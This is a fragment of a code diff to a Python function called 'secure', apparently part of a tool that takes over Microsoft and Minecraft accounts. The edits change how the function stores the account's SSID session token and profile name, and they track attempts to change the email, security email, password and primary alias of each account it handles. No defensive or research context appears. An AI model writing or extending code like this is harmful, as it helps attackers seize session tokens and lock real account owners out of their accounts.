@@ -34,8 +34,7 @@ async def secure(session: httpx.AsyncClient):
     apicanary = await getCookies(session) 
 
     accountInfo = {
-        "oldName": "Failed to Get",
-        "newName": "Couldn't Change!",
+        "name": "Could not find",
         "email": "Couldn't Change!",
         "secEmail": "Couldn't Change!",
         "password": "Couldn't Change!",
@@ -87,7 +86,6 @@ async def secure(session: httpx.AsyncClient):
         # Get capes, profile and purchase method
         if ssid:    
             print("[+] - Got SSID! (Has Minecraft)")
-            accountInfo["SSID"] = ssid
 
             capes = await getCapes(ssid)
             if capes:
@@ -103,7 +101,8 @@ async def secure(session: httpx.AsyncClient):
                 print("[x] - Failed to get profile (No Minecraft Java)")
             else:
                 print(f"[+] - Got profile (Has Minecraft Java)")
-                accountInfo["oldName"] = profile
+                accountInfo["SSID"] = ssid
+                accountInfo["Name"] = profile
                 
                 usernameInfo = await getUsernameInfo(ssid)
                 if type(usernameInfo) is bool:
@@ -120,7 +119,7 @@ async def secure(session: httpx.AsyncClient):
 
     else:
         print("[x] - Failed to get XBL (Account has no Xbox Profile)")
-        accountInfo["oldName"] = "No Minecraft"
+        accountInfo["Name"] = "No Minecraft"
 
     # Security Steps
     await getAMRP(session, T)
@@ -173,6 +172,7 @@ async def secure(session: httpx.AsyncClient):
         else:
             print(f"[X] - Failed to secure this account")
         
+        # Change Primary Alias is broken
         if ralias:
 
             primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
